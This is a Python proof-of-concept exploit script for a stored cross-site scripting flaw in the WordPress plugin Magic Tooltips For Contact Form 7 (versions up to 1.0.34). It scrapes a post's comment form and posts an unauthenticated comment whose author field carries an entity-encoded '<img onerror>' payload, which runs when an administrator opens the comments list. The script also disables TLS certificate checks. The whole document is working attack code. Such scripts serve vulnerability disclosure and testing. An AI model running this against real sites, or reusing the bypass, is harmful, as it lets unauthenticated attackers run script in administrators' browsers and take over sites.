#!/usr/bin/env python3
"""
PoC: Stored XSS via global esc_html bypass in Magic Tooltips For Contact Form 7 <= 1.0.34
Usage:
  python3 poc.py --url=<url-post/page>
Example:
  python3 poc.py --url=http://localhost/wordpress/?p=1
  python3 poc.py --url=http://localhost/wordpress/hello-world/

What it does:
  1. GETs the post/page, auto-finds wp-comments-post.php action + comment_post_ID.
  2. POSTs an unauthenticated comment with author payload:
     &lt;tip&gt;&lt;img src=x onerror=alert(1)&gt;_<rand>
     Raw <tip> is stripped on save, encoded &lt;tip&gt; survives
     (sanitize_text_field + wp_filter_kses + _wp_specialchars) and is
     decoded to live HTML by the plugin's esc_html filter on display.
  3. Payload executes when admin views wp-admin/edit-comments.php
     (class-wp-comments-list-table.php:1003 echo esc_html($comment->comment_author)).

Deps: stdlib only.
"""
import argparse
import random
import re
import string
import sys
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
import ssl


PAYLOAD_TEMPLATE = "&lt;tip&gt;&lt;img src=x onerror=alert(1)&gt;_{rand}"


def rand_str(n=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def build_opener():
    cj = http.cookiejar.CookieJar()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx),
    )
    opener.addheaders = [("User-Agent", "Mozilla/5.0 (PoC Stored-XSS)")]
    return opener


def fetch(opener, url, timeout=20):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (PoC Stored-XSS)"})
    with opener.open(req, timeout=timeout) as r:
        return r.status, r.geturl(), r.read().decode("utf-8", errors="replace")


def find_comment_form(html, page_url):
    # 1. form action containing wp-comments-post.php
    m = re.search(r'<form[^>]+action=["\']([^"\']*wp-comments-post\.php[^"\']*)["\']', html, re.I)
    action = m.group(1) if m else None
    if action:
        action = urllib.parse.urljoin(page_url, action)
    else:
        # fallback: origin + /wp-comments-post.php, try to guess subdir from page url
        p = urllib.parse.urlparse(page_url)
        origin = f"{p.scheme}://{p.netloc}"
        # guess WP root from common paths: walk up 2 levels
        candidates = [
            urllib.parse.urljoin(page_url, "wp-comments-post.php"),
            origin + "/wp-comments-post.php",
            origin + "/wordpress/wp-comments-post.php",
        ]
        action = candidates[0]
        print(f"[!] form action not found, trying {action}")
    # 2. comment_post_ID
    m2 = re.search(r'name=["\']comment_post_ID["\'][^>]*value=["\'](\d+)["\']', html, re.I)
    if not m2:
        m2 = re.search(r'value=["\'](\d+)["\'][^>]*name=["\']comment_post_ID["\']', html, re.I)
    post_id = m2.group(1) if m2 else None
    # 3. comment_parent (optional, default 0)
    m3 = re.search(r'name=["\']comment_parent["\'][^>]*value=["\'](\d+)["\']', html, re.I)
    parent = m3.group(1) if m3 else "0"
    return action, post_id, parent


def submit_comment(opener, action, data, timeout=20):
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        action,
        data=encoded,
        headers={
            "User-Agent": "Mozilla/5.0 (PoC Stored-XSS)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": data.get("_poc_referer", action),
        },
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            body = r.read().decode("utf-8", errors="replace")
            return r.status, r.geturl(), body, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            body = ""
        return e.code, "", body, dict(e.headers or {})
    except Exception as e:
        return -1, "", str(e), {}


def main():
    ap = argparse.ArgumentParser(description="PoC Stored XSS Magic Tooltips For Contact Form 7")
    ap.add_argument("--url", required=True, help="URL of post/page with comments enabled")
    ap.add_argument("--email", default=None, help="comment email (default random)")
    ap.add_argument("--timeout", type=int, default=20)
    args = ap.parse_args()

    page_url = args.url
    tag = rand_str(6)
    payload_author = PAYLOAD_TEMPLATE.format(rand=tag)
    email = args.email or f"poc{tag}@example.com"
    comment_body = f"PoC stored XSS {tag} - please approve"

    print(f"[*] GET {page_url}")
    opener = build_opener()
    try:
        status, final_url, html = fetch(opener, page_url, args.timeout)
    except Exception as e:
        print(f"[-] failed to fetch page: {e}")
        sys.exit(2)
    print(f"[*] GET status {status}")

    action, post_id, parent = find_comment_form(html, final_url)
    print(f"[*] form action: {action}")
    print(f"[*] comment_post_ID: {post_id} parent: {parent}")
    if not post_id:
        print("[-] comment_post_ID not found. Are comments enabled on this post/page?")
        print("    Enable: WP-Admin > Post > Discussion > Allow comments.")
        sys.exit(2)

    data = {
        "author": payload_author,
        "email": email,
        "url": "",
        "comment": comment_body,
        "comment_post_ID": post_id,
        "comment_parent": parent,
        "submit": "Post Comment",
        "_poc_referer": final_url,
    }
    # WP also accepts comment_post_ID etc. via wp_unslash($_POST) -> wp_handle_comment_submission
    print(f"[*] POST {action} as unauthenticated")
    print(f"[*] author payload: {payload_author}")
    status, loc, body, headers = submit_comment(opener, action, data, args.timeout)
    print(f"[*] POST status: {status} redirect: {loc or headers.get('Location', '')}")

    low = body.lower()
    if "duplicate comment" in low or "duplicate_comment" in low:
        print("[-] Duplicate rejected. Re-run (payload is randomized per run).")
        sys.exit(3)
    if "comment submission failure" in low or "invalid comment" in low or "flood" in low:
        print("[-] Submission rejected by WP:")
        print(body[:2000])
        sys.exit(3)
    if status in (301, 302, 303, 307, 308) or "#comment-" in (loc or "") or "awaiting moderation" in low or "will be visible after" in low:
        print("[+] Comment likely stored. Verify:")
        print(f"    1. Login as admin -> wp-admin/edit-comments.php")
        print(f"    2. Look for author: {payload_author}")
        print(f"    3. XSS fires on page load (alert(document.domain)).")
        print(f"    Search marker: {tag} / {comment_body}")
        return
    # wp-comments-post.php often 302s; urllib follows it, so 200 with comment link is also success
    if status == 200 and ("#comment" in low or "awaiting" in low or comment_body.split()[0] in body):
        print("[+] Likely stored (200 + comment marker). Check admin comments list.")
        print(f"    Marker: {tag}")
        return
    print("[?] Unknown result, check manually. Admin list marker:", tag)
    print(body[:3000])


if __name__ == "__main__":
    main()
